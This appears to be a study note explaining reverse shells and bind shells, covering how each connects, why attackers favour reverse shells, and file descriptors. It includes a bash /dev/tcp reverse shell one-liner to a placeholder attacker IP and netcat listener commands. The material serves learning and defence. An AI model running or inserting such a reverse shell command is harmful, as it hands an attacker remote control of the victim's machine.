<h1> Reverse Shell  </h1>



## What is Reverse Shell?
**A Reverse Shell**: is a connection where the victim’s computer connects to the attacker’s computer, and the attacker gets a command-line session on the victim machine.

- A reverse shell (also called a connect-back shell) is a technique where a target system, once exploited, opens an outbound connection to the attacker’s machine.

- The attacker then gains a remote shell session on the victim, allowing them to run commands as if they were sitting at the victim’s terminal.



### Understanding the Concept:
- `Regular Shell`: You connect TO a machine (ssh, telnet)
- `Reverse Shell`: The machine connects BACK TO YOU


### Why Reverse shells for Privilege Escalation?
- **Firewall Bypass**: Outbound connections often allowed, inbound blocked
- **NAT Bypass**: Works behind routers/firewalls
- **Stealth**: Harder to detect than bind shells
- **Persistence**: Maintain access after initial foothold



### Basic Reverse Shell Fundamentals

#### The concept:
````
Attacker Machine (Kali)            Victim Machine (Target)
     Listener Port 4444 ←--------------- Connection
           ^                                    |
           |                                    |
      "nc -lvnp 4444"                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
````


#### Threee Key File Descriptions:
````
0 = stdin   (Standard Input - keyboard)
1 = stdout  (Standard Output - screen)  
2 = stderr  (Standard Error - error messages)
````





## Reverse Shell And Bind Shell

### Reverse Shell: 
**Reverse Shell**: The target machine initiates a connection to the attacker’s machine. And The attacker force the vulnerable compromised system to initiate a connection to the atacker machine.

#### How it works:
- Attacker sets up a listener (e.g., `nc -lvp 4444`).
- Target machine runs malicious code that connects back to the attacker’s IP and port.
- Once connected, the attacker gains a shell on the target.

````
Compromised System --------> Attacker Machine
````
The attacker machine now acts as the server, with a public IP on which it listen for incoming connection. The compromised system instead acts as a client.



### Bind Shell:
**Bind Shell**: The target machine opens a port and “binds” a shell to it, waiting for the attacker to connect. And the force the vulnerable compromise server to open a port and to listen for incoming connection.

#### How it work:
- Target runs code that listens on a port (e.g., port 4444).
- Attacker connects to that port using netcat or similar tools.
- Once connected, attacker gains shell access.

````
Attacker Machine -------> Compromised System
````
The compromise system accts as a server, while the attacker machine acts a client.
